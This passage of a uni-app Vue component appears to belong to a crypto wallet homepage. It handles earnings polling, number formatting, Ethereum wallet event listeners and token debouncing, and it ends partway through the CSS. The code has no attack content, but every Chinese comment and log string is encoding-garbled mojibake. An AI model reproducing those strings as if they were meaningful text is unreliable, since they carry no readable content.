		async fetchUserInfo(source = 'polling') {
			try {
				console.log(`Ëé∑ÂèñÁî®Êà∑‰ø°ÊÅØ‰∏≠... (Êù•Ê∫ê: ${source})`);
				
				// Á°Æ‰øùÊúâÊúâÊïàtoken
				const currentToken = store.getToken();
				if (!currentToken) {
					console.warn('Ê≤°ÊúâÊúâÊïàtokenÔºåË∑≥ËøáÁî®Êà∑‰ø°ÊÅØËé∑Âèñ');
					return;
				}
				
				const response = await api.user.getInfo();
				
				if (response) {
					console.log(`Áî®Êà∑‰ø°ÊÅØÂìçÂ∫î (${source}):`, response);
					
					// Êõ¥Êñ∞Êî∂ÁõäÊï∞ÊçÆ
					this.earningsData = {
						total_earnings: response.total_revenue || '0.00',
						earnings_24h: response.earning_24 || '0.00'
					};
					
					console.log(`Áî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÊàêÂäü (${source}):`, this.earningsData);
				} else {
					console.log(`Áî®Êà∑‰ø°ÊÅØËøîÂõûÁ©∫ (${source})`);
				}
			} catch (error) {
				console.error(`Ëé∑ÂèñÁî®Êà∑‰ø°ÊÅØÂ§±Ë¥• (${source}):`, error);
				
				// Â¶ÇÊûúÊòØtokenÁõ∏ÂÖ≥ÈîôËØØÔºåÂèØËÉΩÈúÄË¶ÅÈáçÊñ∞ËøûÊé•Èí±ÂåÖ
				if (error.message && (error.message.includes('token') || error.message.includes('unauthorized'))) {
					console.warn('ÂèØËÉΩtokenÊó†ÊïàÔºåËÄÉËôëÈáçÊñ∞ËøûÊé•Èí±ÂåÖ');
				}
			}
		},

		// Êñ∞Â¢ûÔºöÊ†ºÂºèÂåñÊî∂ÁõäÈáëÈ¢ù
		formatEarnings(amount) {
			if (!amount || amount === '0' || amount === '0.00') return '0.00';
			
			const number = parseFloat(amount);
			if (isNaN(number)) return '0.00';

			return number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 2
			});
		},

		// ÂêåÊó∂‰øÆÊîπÊ†ºÂºèÂåñÊñπÊ≥ïÔºåÂ¢ûÂä†Ë∞ÉËØï‰ø°ÊÅØ
		formatErcNumber(num) {
			console.log('=== formatErcNumberË∞ÉÁî® ===');
			console.log('ËæìÂÖ•ÂÄº:', num, 'Á±ªÂûã:', typeof num);
			
			if (!num || num === '0') {
				console.log('ËæìÂÖ•‰∏∫Á©∫Êàñ0ÔºåËøîÂõû"0"');
				return '0';
			}
			
			const number = parseFloat(num);
			if (isNaN(number)) {
				console.log('Ëß£ÊûêÊï∞Â≠óÂ§±Ë¥•:', num);
				return '0';
			}

			console.log('Ëß£ÊûêÂêéÁöÑÊï∞Â≠ó:', number);

			// ÂØπ‰∫éÂ§ßÊï∞Â≠óÔºå‰ΩøÁî®ÈÄóÂè∑ÂàÜÈöîÔºå‰∏çÊòæÁ§∫Â∞èÊï∞ÁÇπÔºàÂõ†‰∏∫ÊòØ‰∫∫Êï∞„ÄÅËäÇÁÇπÊï∞Á≠âÊï¥Êï∞Ôºâ
			if (number >= 1000000) {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
				console.log('Ê†ºÂºèÂåñÁªìÊûú(Â§ßÊï∞Â≠ó):', result);
				return result;
			} else if (number >= 1000) {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
				console.log('Ê†ºÂºèÂåñÁªìÊûú(‰∏≠Á≠âÊï∞Â≠ó):', result);
				return result;
			} else {
				const result = Math.round(number).toString();
				console.log('Ê†ºÂºèÂåñÁªìÊûú(Â∞èÊï∞Â≠ó):', result);
				return result;
			}
		},

		// ‰øÆÊîπÔºöÊ†ºÂºèÂåñËæìÂá∫ÂÄºÊòæÁ§∫
		formatOutputValue(num) {
			console.log('formatOutputValue input:', num, 'type:', typeof num);
			
			if (!num || num === '0') return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';

			console.log('Output value parsed number:', number);

			const result = number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 6
			});
			
			console.log('Output value formatted result:', result);
			return result;
		},

		// ‰øÆÊîπÔºöÊ†ºÂºèÂåñÊî∂ÁõäÊòæÁ§∫
		formatRevenueValue(num) {
			console.log('formatRevenueValue input:', num, 'type:', typeof num);
			
			if (!num || num === '0') return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';

			console.log('Parsed revenue number:', number);

			// Â¶ÇÊûúÊï∞ÂÄºÂæàÂ§ßÔºåÊòæÁ§∫‰∏∫ÁÆÄÂåñÊ†ºÂºè
			if (number >= 1e9) {
				const result = (number / 1e9).toFixed(2) + 'B';
				console.log('Revenue format result (B):', result);
				return result;
			} else if (number >= 1e6) {
				const result = (number / 1e6).toFixed(2) + 'M';
				console.log('Revenue format result (M):', result);
				return result;
			} else {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 2,
					maximumFractionDigits: 2
				});
				console.log('Revenue format result (normal):', result);
				return result;
			}
		},

		// Êñ∞Â¢ûÔºöÊ†ºÂºèÂåñÊï∞Â≠óÊòæÁ§∫
		formatNumber(num) {
			if (!num && num !== 0) return '0';
			
			// Â§ÑÁêÜÂ≠óÁ¨¶‰∏≤Á±ªÂûãÁöÑÊï∞Â≠ó
			const number = typeof num === 'string' ? parseFloat(num) : num;
			if (isNaN(number)) return '0';

			// Ê†ºÂºèÂåñÂ§ßÊï∞Â≠óÊòæÁ§∫
			if (number >= 1e9) {
				return (number / 1e9).toFixed(2) + 'B';
			} else if (number >= 1e6) {
				return (number / 1e6).toFixed(2) + 'M';
			} else if (number >= 1e3) {
				return (number / 1e3).toFixed(2) + 'K';
			} else {
				return number.toFixed(2);
			}
		},

		// Êñ∞Â¢ûÔºöÊ†ºÂºèÂåñÊµÅÂä®ÊÄßÊòæÁ§∫
		formatLiquidity(num) {
			if (!num && num !== 0) return '0';
			
			const number = typeof num === 'string' ? parseFloat(num) : num;
			if (isNaN(number)) return '0';

			// ÂØπ‰∫éÊµÅÂä®ÊÄßÔºå‰øùÁïôÂ∞èÊï∞ÁÇπ‰ª•Êèê‰æõÊõ¥Á≤æÁ°ÆÁöÑ‰ø°ÊÅØ
			if (number >= 1000) {
				return number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
			} else {
				return number.toFixed(2);
			}
		},

		// Êñ∞Â¢ûÔºöÊ†ºÂºèÂåñÊòæÁ§∫ÂÄº
		formatDisplayValue(num) {
			if (!num || num === 0) return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';
			
			// Ê†πÊçÆÊï∞ÂÄºÂ§ßÂ∞èÈÄâÊã©ÂêàÈÄÇÁöÑÊòæÁ§∫Ê†ºÂºè
			if (number >= 1000) {
				return (number / 1000).toFixed(2);
			} else {
				return number.toFixed(2);
			}
		},

		// Êñ∞Â¢ûÔºöÊ†ºÂºèÂåñ‰ª•Â§™ÂùäÊï∞ÂÄºÊòæÁ§∫
		formatEthValue(ethValue) {
			if (!ethValue || ethValue === '0') return '0.00';
			
			const number = parseFloat(ethValue);
			if (isNaN(number)) return '0.00';

			// ÂØπ‰∫éETH‰ª∑Ê†ºÔºå‰øùÁïô2‰ΩçÂ∞èÊï∞Âπ∂Ê∑ªÂä†ÂçÉÂàÜ‰ΩçÂàÜÈöîÁ¨¶
			return number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 2
			});
		},

		// ËÆæÁΩÆÈí±ÂåÖ‰∫ã‰ª∂ÁõëÂê¨
		setupWalletListeners() {
			try {
				console.log('È¶ñÈ°µËÆæÁΩÆÈí±ÂåÖ‰∫ã‰ª∂ÁõëÂê¨...');
				
				// Ëé∑Âèñ‰ª•Â§™ÂùäÊèê‰æõËÄÖ
				let ethereum = this.getEthereumProvider();
				
				if (!ethereum) {
					console.log('Êú™ÊâæÂà∞‰ª•Â§™ÂùäÊèê‰æõËÄÖÔºåÊó†Ê≥ïËÆæÁΩÆÁõëÂê¨Âô®');
					return;
				}
				
				// ÁßªÈô§‰πãÂâçÁöÑÁõëÂê¨Âô®ÔºàÈÅøÂÖçÈáçÂ§çÁªëÂÆöÔºâ
				this.removeWalletListeners();
				
				// ÁõëÂê¨Ë¥¶Êà∑ÂèòÂåñ
				this.accountsChangedHandler = (accounts) => {
					console.log('È¶ñÈ°µÊ£ÄÊµãÂà∞Ë¥¶Êà∑ÂèòÂåñ:', accounts);
					this.handleAccountsChanged(accounts);
				};
				
				// ÁõëÂê¨ÈìæÂèòÂåñ
				this.chainChangedHandler = (chainId) => {
					console.log('È¶ñÈ°µÊ£ÄÊµãÂà∞ÈìæÂèòÂåñ:', chainId);
					this.handleChainChanged(chainId);
				};
				
				// ÁõëÂê¨ËøûÊé•Áä∂ÊÄÅÂèòÂåñ
				this.connectHandler = (connectInfo) => {
					console.log('È¶ñÈ°µÊ£ÄÊµãÂà∞ËøûÊé•:', connectInfo);
					this.handleConnect(connectInfo);
				};
				
				// ÁõëÂê¨Êñ≠ÂºÄËøûÊé•
				this.disconnectHandler = (error) => {
					console.log('È¶ñÈ°µÊ£ÄÊµãÂà∞Êñ≠ÂºÄËøûÊé•:', error);
					this.handleDisconnect(error);
				};
				
				// ÁªëÂÆö‰∫ã‰ª∂ÁõëÂê¨Âô®
				ethereum.on('accountsChanged', this.accountsChangedHandler);
				ethereum.on('chainChanged', this.chainChangedHandler);
				ethereum.on('connect', this.connectHandler);
				ethereum.on('disconnect', this.disconnectHandler);
				
				console.log('È¶ñÈ°µÈí±ÂåÖ‰∫ã‰ª∂ÁõëÂê¨Âô®ËÆæÁΩÆÊàêÂäü');
				
			} catch (error) {
				console.error('È¶ñÈ°µËÆæÁΩÆÈí±ÂåÖÁõëÂê¨Âô®Â§±Ë¥•:', error);
			}
		},

		// ÁßªÈô§Èí±ÂåÖ‰∫ã‰ª∂ÁõëÂê¨
		removeWalletListeners() {
			try {
				let ethereum = this.getEthereumProvider();
				
				if (ethereum && this.accountsChangedHandler) {
					ethereum.removeListener('accountsChanged', this.accountsChangedHandler);
					ethereum.removeListener('chainChanged', this.chainChangedHandler);
					ethereum.removeListener('connect', this.connectHandler);
					ethereum.removeListener('disconnect', this.disconnectHandler);
					
					// Ê∏ÖÁ©∫Â§ÑÁêÜÂô®ÂºïÁî®
					this.accountsChangedHandler = null;
					this.chainChangedHandler = null;
					this.connectHandler = null;
					this.disconnectHandler = null;
					
					console.log('È¶ñÈ°µÈí±ÂåÖ‰∫ã‰ª∂ÁõëÂê¨Âô®Â∑≤ÁßªÈô§');
				}
			} catch (error) {
				console.error('È¶ñÈ°µÁßªÈô§Èí±ÂåÖÁõëÂê¨Âô®Â§±Ë¥•:', error);
			}
		},

		// Â§ÑÁêÜË¥¶Êà∑ÂèòÂåñ
		async handleAccountsChanged(accounts) {
			console.log('=== Homepage handling account change ===');
			console.log('New account list:', accounts);
			
			try {
				if (accounts.length === 0) {
					// Áî®Êà∑Êñ≠ÂºÄ‰∫ÜÊâÄÊúâË¥¶Êà∑
					console.log('User disconnected all accounts');
					this.handleWalletDisconnected();
					return; // Êó©ÊúüËøîÂõûÔºåÈÅøÂÖçÂêéÁª≠Â§ÑÁêÜ
				}

				// Áî®Êà∑ÂàáÊç¢‰∫ÜË¥¶Êà∑
				const newAddress = accounts[0];
				console.log('User switched to new account:', newAddress);
				
				if (!this.isValidEthAddress(newAddress)) {
					console.warn('New account is not a valid ETH address:', newAddress);
					uni.showToast({
						title: 'Detected non-ETH account, please switch to ETH account',
						icon: 'none',
						duration: 3000
					});
					return; // Êó©ÊúüËøîÂõû
				}

				const currentAddress = this.walletInfo.address;
				if (newAddress === currentAddress) {
					console.log('Account address unchanged, no update needed');
					return; // Êó©ÊúüËøîÂõû
				}

				console.log('Account switching from', currentAddress, 'to', newAddress);
				
				// Ê†áËÆ∞ÂàáÊç¢Áä∂ÊÄÅ
				let switchSuccess = false;
				let apiSuccess = false;
				
				try {
					// Êõ¥Êñ∞Êú¨Âú∞Â≠òÂÇ®ÂíåÁïåÈù¢ÊòæÁ§∫
					uni.setStorageSync('walletAddress', newAddress);
					this.walletInfo.address = newAddress;
					switchSuccess = true;
					console.log('Local wallet info updated successfully');
					
				} catch (localError) {
					console.error('Failed to update local wallet info:', localError);
					throw localError; // ÈáçÊñ∞ÊäõÂá∫ÔºåËøôÊòØÂÖ≥ÈîÆÈîôËØØ
				}

				// Ë∞ÉÁî®APIÂêåÊ≠•Êñ∞Âú∞ÂùÄÔºàËøô‰∏™Â§±Ë¥•‰∏çÂ∫îËØ•ÂΩ±ÂìçÂàáÊç¢Áä∂ÊÄÅÔºâ
				try {
					console.log('Starting to sync new address to server...');
					const responseData = await api.user.walletConnect(
						newAddress,
						uni.getStorageSync('userTid') || ''
					);

					console.log('API response:', responseData);

					if (responseData && responseData.code === 0) {
						// ËøûÊé•ÊàêÂäüÔºå‰øùÂ≠òtoken
						if (responseData.token) {
							store.setToken(responseData.token);
							console.log('New wallet address token saved:', responseData.token.substring(0, 10) + '...');
						}
						
						apiSuccess = true;
						console.log('New wallet address synchronized to server');
					} else {
						console.warn('API returned non-success status:', responseData);
						// ‰∏çÊäõÂá∫ÈîôËØØÔºåÂõ†‰∏∫Ëøô‰∏çÂ∫îËØ•ÂΩ±ÂìçÈí±ÂåÖÂàáÊç¢
					}
				} catch (apiError) {
					console.warn('API sync failed, but does not affect wallet switching:', apiError.message);
					// ÊòæÁ§∫APIÂ§±Ë¥•ÊèêÁ§∫Ôºå‰ΩÜ‰∏çÂΩ±ÂìçÊï¥‰ΩìÂàáÊç¢Áä∂ÊÄÅ
					uni.showToast({
						title: 'Wallet switching successful, but synchronization failed',
						icon: 'none',
						duration: 2000
					});
				}

				// Â¶ÇÊûúÊú¨Âú∞ÂàáÊç¢ÊàêÂäüÔºåÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
				if (switchSuccess) {
					console.log('Wallet switching successful, showing success message');
					uni.showToast({
						title: `Wallet switched to ${this.formatAddress(newAddress)}`,
						icon: 'success',
						duration: 3000
					});
					
					// Â∞ùËØïÈáçÊñ∞Ëé∑ÂèñÁî®Êà∑Êï∞ÊçÆÔºàÂ§±Ë¥•‰∏çÂΩ±ÂìçÂàáÊç¢Áä∂ÊÄÅÔºâ
					try {
						this.fetchUserInfo();
						this.fetchErcData();
					} catch (dataError) {
						console.warn('Failed to get user data:', dataError.message);
						// ÈùôÈªòÂ§±Ë¥•Ôºå‰∏çÂΩ±ÂìçÁî®Êà∑‰ΩìÈ™å
					}
				}

			} catch (error) {
				// Âè™ÊúâÁúüÊ≠£ÁöÑÂÖ≥ÈîÆÈîôËØØÊâç‰ºöÂà∞ËææËøôÈáå
				console.error('Critical error occurred during wallet switching:', error);
				
				// ÊòæÁ§∫ÂÖ∑‰ΩìÁöÑÈîôËØØ‰ø°ÊÅØÔºåËÄå‰∏çÊòØÈÄöÁî®ÁöÑÂ§±Ë¥•ÊèêÁ§∫
				const errorMessage = error.message || 'Wallet switching failed';
				uni.showToast({
					title: errorMessage,
					icon: 'none',
					duration: 3000
				});
			}
		},

		// Â§ÑÁêÜÈìæÂèòÂåñ
		handleChainChanged(chainId) {
			console.log('=== È¶ñÈ°µÂ§ÑÁêÜÈìæÂèòÂåñ ===');
			console.log('Êñ∞ÈìæID:', chainId);
			
			// ÂèØ‰ª•Ê†πÊçÆÈúÄË¶ÅÊ∑ªÂä†ÈìæÂàáÊç¢ÁöÑÂ§ÑÁêÜÈÄªËæë
			// ‰æãÂ¶ÇÔºöÊ£ÄÊü•ÊòØÂê¶ÊòØÊîØÊåÅÁöÑÈìæÔºåÁªôÁî®Êà∑ÊèêÁ§∫Á≠â
		},

		// Â§ÑÁêÜËøûÊé•
		handleConnect(connectInfo) {
			console.log('=== È¶ñÈ°µÂ§ÑÁêÜËøûÊé• ===');
			console.log('ËøûÊé•‰ø°ÊÅØ:', connectInfo);
		},

		// Â§ÑÁêÜÊñ≠ÂºÄËøûÊé•
		handleDisconnect(error) {
			console.log('=== È¶ñÈ°µÂ§ÑÁêÜÊñ≠ÂºÄËøûÊé• ===');
			console.log('Êñ≠ÂºÄËøûÊé•ÈîôËØØ:', error);
			this.handleWalletDisconnected();
		},

		// Â§ÑÁêÜÈí±ÂåÖÊñ≠ÂºÄËøûÊé•
		handleWalletDisconnected() {
			console.log('Processing wallet disconnection');
			
			// Ê∏ÖÈô§Êú¨Âú∞Â≠òÂÇ®
			uni.removeStorageSync('walletConnected');
			uni.removeStorageSync('walletAddress');
			uni.removeStorageSync('walletType');
			store.clearToken();
			
			// ÊòæÁ§∫ÊèêÁ§∫
			uni.showToast({
				title: 'Wallet disconnected',
				icon: 'none',
				duration: 2000
			});
			
			// Ë∑≥ËΩ¨Âà∞ËøûÊé•È°µÈù¢
			setTimeout(() => {
				uni.reLaunch({
					url: '/pages/wallet/connect'
				});
			}, 2000);
		},

		// È™åËØÅ‰ª•Â§™ÂùäÂú∞ÂùÄ
		isValidEthAddress(address) {
			if (!address) return false;
			
			// Âü∫Êú¨ÁöÑ‰ª•Â§™ÂùäÂú∞ÂùÄÊ†ºÂºèÊ£ÄÊü•
			const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
			return ethAddressRegex.test(address);
		},

		// Êñ∞Â¢ûÔºöËÆæÁΩÆstoreÁõëÂê¨Âô® - Ê∑ªÂä†Èò≤Êäñ
		setupStoreListeners() {
			if (this.storeUnsubscribe) {
				console.log('StoreÁõëÂê¨Âô®Â∑≤Â≠òÂú®ÔºåË∑≥ËøáÈáçÂ§çËÆæÁΩÆ');
				return;
			}

			console.log('ËÆæÁΩÆStoreÁõëÂê¨Âô®...');
			// ÁõëÂê¨tokenÂèòÂåñ
			this.storeUnsubscribe = store.addListener((event, data) => {
				console.log('Store‰∫ã‰ª∂:', event, data);
				
				if (event === 'tokenUpdated') {
					// ‰ΩøÁî®Èò≤ÊäñÊú∫Âà∂Â§ÑÁêÜtokenÊõ¥Êñ∞
					this.handleTokenUpdatedWithDebounce(data);
				} else if (event === 'tokenCleared') {
					console.log('Ê£ÄÊµãÂà∞tokenÊ∏ÖÈô§');
					this.handleTokenCleared();
				}
			});
		},

		// Êñ∞Â¢ûÔºöÂ∏¶Èò≤ÊäñÁöÑtokenÊõ¥Êñ∞Â§ÑÁêÜ
		handleTokenUpdatedWithDebounce(data) {
			const now = Date.now();
			
			// Èò≤ÊäñÔºöÂ¶ÇÊûúË∑ùÁ¶ª‰∏äÊ¨°Êõ¥Êñ∞‰∏çÂà∞2ÁßíÔºåÂèñÊ∂à‰πãÂâçÁöÑÂ§ÑÁêÜ
			if (this.tokenUpdateDebounceTimer) {
				clearTimeout(this.tokenUpdateDebounceTimer);
			}

			// Â¶ÇÊûúË∑ùÁ¶ª‰∏äÊ¨°Êõ¥Êñ∞‰∏çÂà∞1ÁßíÔºåÁõ¥Êé•ÂøΩÁï•
			if (now - this.lastTokenUpdateTime < 1000) {
				console.log('TokenÊõ¥Êñ∞Ëøá‰∫éÈ¢ëÁπÅÔºåÂøΩÁï•Êú¨Ê¨°Êõ¥Êñ∞');
				return;
			}

			console.log('TokenÊõ¥Êñ∞Èò≤ÊäñÂ§ÑÁêÜ...');
			this.lastTokenUpdateTime = now;

			// Âª∂Ëøü500msÂ§ÑÁêÜÔºåÈÅøÂÖçÈ¢ëÁπÅË∞ÉÁî®
			this.tokenUpdateDebounceTimer = setTimeout(() => {
				this.handleTokenUpdated(data);
				this.tokenUpdateDebounceTimer = null;
			}, 500);
		},

		// Êñ∞Â¢ûÔºöÂ§ÑÁêÜtokenÊõ¥Êñ∞‰∫ã‰ª∂ - ÂáèÂ∞ëÈáçÂ§çË∞ÉÁî®
		async handleTokenUpdated(data) {
			console.log('Â§ÑÁêÜtokenÊõ¥Êñ∞:', data);
			
			try {
				// ‰∏çÈáçÁΩÆËΩÆËØ¢ÂÆöÊó∂Âô®ÔºåÂè™Âà∑Êñ∞Êï∞ÊçÆ
				console.log('TokenÊõ¥Êñ∞ÔºåÁ´ãÂç≥Âà∑Êñ∞Êï∞ÊçÆÔºà‰∏çÈáçÁΩÆÂÆöÊó∂Âô®Ôºâ');
				
				// Á´ãÂç≥Ëé∑ÂèñÊúÄÊñ∞Êï∞ÊçÆÔºå‰ΩÜ‰∏çÈáçÂ§çÂêØÂä®ËΩÆËØ¢
				const promises = [];
				promises.push(this.fetchUserInfo());
				promises.push(this.fetchErcData());
				
				// Âπ∂ÂèëÊâßË°åÔºåÊèêÈ´òÊïàÁéá
				await Promise.allSettled(promises);
				
				console.log('TokenÊõ¥Êñ∞ÂêéÊï∞ÊçÆÂà∑Êñ∞ÂÆåÊàê');
			} catch (error) {
				console.error('TokenÊõ¥Êñ∞ÂêéÊï∞ÊçÆÂà∑Êñ∞Â§±Ë¥•:', error);
			}
		},

		// Êñ∞Â¢ûÔºöÂ§ÑÁêÜtokenÊ∏ÖÈô§‰∫ã‰ª∂
		handleTokenCleared() {
			console.log('Â§ÑÁêÜtokenÊ∏ÖÈô§‰∫ã‰ª∂');
			
			// ÂÅúÊ≠¢ÊâÄÊúâËΩÆËØ¢
			this.stopExchangeDataPolling();
			this.stopErcDataPolling();
			this.stopUserInfoPolling();
			
			// Ê∏ÖÁêÜÁõ∏ÂÖ≥Êï∞ÊçÆ
			this.earningsData = {
				total_earnings: '0.00',
				earnings_24h: '0.00'
			};
		},

		// Êñ∞Â¢ûÔºöËÆæÁΩÆWebSocketÁõëÂê¨Âô®
		setupWebSocketListeners() {
			// ÁõëÂê¨WebSocketÊï∞ÊçÆÊõ¥Êñ∞
			this.exchangeWebSocketListener = (data) => {
				console.log('Êî∂Âà∞‰∫§ÊòìÊâÄWebSocketÊï∞ÊçÆÊõ¥Êñ∞:', data);
				this.handleExchangeDataUpdate(data);
			};
			
			uni.$on('exchangeDataUpdated', this.exchangeWebSocketListener);
		},

		// Êñ∞Â¢ûÔºöÂ§ÑÁêÜ‰∫§ÊòìÊâÄÊï∞ÊçÆÊõ¥Êñ∞
		handleExchangeDataUpdate(result) {
			if (result.success && result.data) {
				// Â∞ÜÊé•Âè£ËøîÂõûÁöÑÊï∞ÊçÆÊ†ºÂºèÂåñ
				const formattedData = {};
				
				// Â§ÑÁêÜÊØè‰∏™‰∫§ÊòìÊâÄÁöÑÊï∞ÊçÆ
				Object.keys(result.data).forEach(exchangeName => {
					const lowerCaseName = exchangeName.toLowerCase();
					let mappedName = lowerCaseName;
					
					// ÂêçÁß∞Êò†Â∞ÑËßÑÂàô
					if (lowerCaseName === 'okex') {
						mappedName = 'okex';
					} else if (lowerCaseName === 'huobi') {
						mappedName = 'huobi';
					} else if (lowerCaseName === 'binance') {
						mappedName = 'binance';
					} else if (lowerCaseName === 'gate') {
						mappedName = 'gate';
					} else if (lowerCaseName === 'kucoin') {
						mappedName = 'kucoin';
					} else if (lowerCaseName === 'kraken') {
						mappedName = 'kraken';
					}
					
					if (this.exchangeConfig[mappedName]) {
						formattedData[mappedName] = result.data[exchangeName];
					}
				});

				this.exchangeData = formattedData;
				console.log('‰∫§ÊòìÊâÄÊï∞ÊçÆÊõ¥Êñ∞ÊàêÂäü (WebSocket):', formattedData);
			}
		},

		// Êñ∞Â¢ûÔºöÁßªÈô§WebSocketÁõëÂê¨Âô®
		removeWebSocketListeners() {
			if (this.exchangeWebSocketListener) {
				uni.$off('exchangeDataUpdated', this.exchangeWebSocketListener);
				this.exchangeWebSocketListener = null;
				console.log('WebSocketÁõëÂê¨Âô®Â∑≤ÁßªÈô§');
			}
		},

		// Êñ∞Â¢ûÔºöÊ∏ÖÁêÜÊâÄÊúâËµÑÊ∫ê
		cleanup() {
			console.log('Ê∏ÖÁêÜÊâÄÊúâËµÑÊ∫ê...');
			
			// ÂÅúÊ≠¢ËΩÆËØ¢
			this.stopAllPolling();
			
			// Ê∏ÖÁêÜÈò≤ÊäñÂÆöÊó∂Âô®
			if (this.tokenUpdateDebounceTimer) {
				clearTimeout(this.tokenUpdateDebounceTimer);
				this.tokenUpdateDebounceTimer = null;
			}
			
			// ÁßªÈô§ÁõëÂê¨Âô®
			this.removeWalletListeners();
			this.removeStoreListeners();
			this.removeWebSocketListeners();
			this.removeUserInfoUpdateListener();
		},

		// Êñ∞Â¢ûÔºöÁßªÈô§Áî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÁõëÂê¨Âô®
		removeUserInfoUpdateListener() {
			if (this.userInfoUpdateListener) {
				uni.$off('userInfoUpdated', this.userInfoUpdateListener);
				this.userInfoUpdateListener = null;
				console.log('Áî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÁõëÂê¨Âô®Â∑≤ÁßªÈô§');
			}
		},

		// Êñ∞Â¢ûÔºöËÆæÁΩÆÁî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÁõëÂê¨Âô®
		setupUserInfoUpdateListener() {
			this.userInfoUpdateListener = (data) => {
				console.log('Êî∂Âà∞Áî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞‰∫ã‰ª∂:', data);
				this.handleUserInfoUpdate(data);
			};
			
			uni.$on('userInfoUpdated', this.userInfoUpdateListener);
		},

		// Êñ∞Â¢ûÔºöÂ§ÑÁêÜÁî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞
		handleUserInfoUpdate(eventData) {
			const { data, source, requestId } = eventData;
			
			console.log(`Processing user info update - Source: ${source}, Request ID: ${requestId}`);
			
			if (data) {
				// Êõ¥Êñ∞Êî∂ÁõäÊï∞ÊçÆ
				this.earningsData = {
					total_earnings: data.total_revenue || '0.00',
					earnings_24h: data.earning_24 || '0.00'
				};
				
				console.log('User info updated:', this.earningsData);
				
				// Â¶ÇÊûúÊòØwallet_connectËß¶ÂèëÁöÑÁ´ãÂç≥Êõ¥Êñ∞ÔºåÊöÇÂÅú‰∏Ä‰∏ãÂ∏∏ËßÑËΩÆËØ¢ÈÅøÂÖçÈáçÂ§ç
				if (source === 'wallet_connect_immediate') {
					this.pauseUserInfoPolling(5000); // ÊöÇÂÅú5Áßí
				}
			}
		},

		// Êñ∞Â¢ûÔºöÊöÇÂÅúÁî®Êà∑‰ø°ÊÅØËΩÆËØ¢
		pauseUserInfoPolling(duration) {
			console.log(`Pausing user info polling for ${duration}ms`);
			
			// ÊöÇÊó∂ÂÅúÊ≠¢ËΩÆËØ¢
			this.stopUserInfoPolling();
			
			// Âª∂ËøüÈáçÂêØ
			setTimeout(() => {
				if (this.isPollingActive) {
					console.log('Restarting user info polling');
					this.startUserInfoPolling(false); // ‰∏çÁ´ãÂç≥ÊâßË°å
				}
			}, duration);
		},

		// ‰øÆÊîπÔºöÂºÄÂßãÁî®Êà∑‰ø°ÊÅØËΩÆËØ¢ - Â¢ûÂä†Á´ãÂç≥ÊâßË°åÈÄâÈ°π
		startUserInfoPolling(immediately = true) {
			// ÂÖàÂÅúÊ≠¢Áé∞ÊúâËΩÆËØ¢
			this.stopUserInfoPolling();
			
			// Á´ãÂç≥Ëé∑Âèñ‰∏ÄÊ¨°Êï∞ÊçÆÔºàÂèØÈÄâÔºâ
			if (immediately) {
				this.fetchUserInfo();
			}
			
			// ËÆæÁΩÆ30ÁßíËΩÆËØ¢
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 30000);
			
			console.log('ÂºÄÂßãËΩÆËØ¢Áî®Êà∑‰ø°ÊÅØÔºåÊØè30ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°');
		},
	}
}
</script>

<style>


.exchange-details {
	padding: 20rpx 30rpx;
	animation: slideDown 0.3s ease-out;
	border-top: 1px solid #f0f0f0;
	background-color: #fafafa;
}

.detail-header {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
	padding-bottom: 8rpx;
	border-bottom: 1px solid #eeeeee;
}

.detail-icon-space {
	width: 47rpx; /* ‰∏écoin-icon + margin-rightÁõ∏Âêå */
	margin-right: 15rpx;
}

.detail-label {
	font-size: 22rpx;
	color: #666;
	font-weight: 600;
	flex: 1;
	text-align: center;
}

.coin-row {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
	min-height: 40rpx;
}

.coin-icon {
	width: 32rpx;
	height: 32rpx;
	margin-right: 15rpx;
	border-radius: 50%;
}

.coin-name {
	font-size: 24rpx;
	color: #333;
	flex: 1;
	text-align: center;
	font-weight: 500;
}

.coin-value {
	font-size: 22rpx;
	color: #666;
	flex: 1;
	text-align: center;
}

.coin-number {
	font-size: 22rpx;
	color: #666;
	flex: 1;
	text-align: center;
}

.index-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	position: relative;
}

.gradient-bg {
	position: relative;
	top: 0;
	left: 0;
	right: 0;
	height: 50vh;
	background: linear-gradient(to bottom, #094884, white);
	z-index: 0;
}

.overlay-image-container {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	height: 25vh;
	z-index: 1;
	display: flex;
	justify-content: center;
	align-items: flex-start;
	overflow: hidden;
}

.overlay-image {
	width: 100%;
	height: 100%;
	object-fit: cover;
	object-position: top;
	margin-top: 0;
	display: block;
}



.content-container {
	position: relative;
	z-index: 2;
	margin: 0 30rpx;
	margin-top: -25vh;
	padding: 40rpx;
	background-color: #ffffff;
	border-radius: 20rpx 20rpx 0 0;
	box-shadow: 0 -4rpx 20rpx rgba(0, 0, 0, 0.1);
	min-height: 70vh;
}

.wallet-status-card {
	background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
	border-radius: 15rpx;
	padding: 30rpx;
	margin-bottom: 30rpx;
	box-shadow: 0 4rpx 12rpx rgba(76, 175, 80, 0.3);
}

.wallet-status-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.wallet-type {
	font-size: 28rpx;
